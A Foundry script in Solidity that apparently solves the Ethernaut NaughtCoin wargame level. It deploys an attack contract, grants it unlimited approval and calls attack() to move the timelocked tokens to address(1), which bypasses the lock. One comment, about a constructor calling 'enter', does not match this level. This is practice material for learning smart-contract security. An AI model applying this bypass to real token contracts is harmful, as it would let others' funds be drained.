// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/** 
 * @notice When using this script set the compiler version to v0.8.12+commit.f00d7308
 * @notice Run with 1000 Optimization runs
 */

import "forge-std/Script.sol";

import { HackNaughtCoin, INaughtCoin } from "../../contracts/solutions/HackNaughtCoin.sol";

contract NaughtCoinScript is Script {

    function run() external {
        uint256 deployerPrivateKey = vm.envUint("ACCOUNT_PRIVATE_KEY");
        address levelInstanceAddress = vm.envAddress("CONTRACT_INSTANCE_ADDRESS");
        INaughtCoin naughtCoin = INaughtCoin(levelInstanceAddress);
        vm.startBroadcast(deployerPrivateKey);

        // No need to do anything after deployment as the constructor will call the enter function
        HackNaughtCoin hackNaughtCoin = new HackNaughtCoin(levelInstanceAddress);
        
        // Approve hackNaughtCoin to facilitate the transfer of tokens
        naughtCoin.approve(address(hackNaughtCoin), type(uint256).max);
        // Send tokens to address 1 (burning the tokens pretty much)
        hackNaughtCoin.attack(address(1));

        vm.stopBroadcast();

    }
}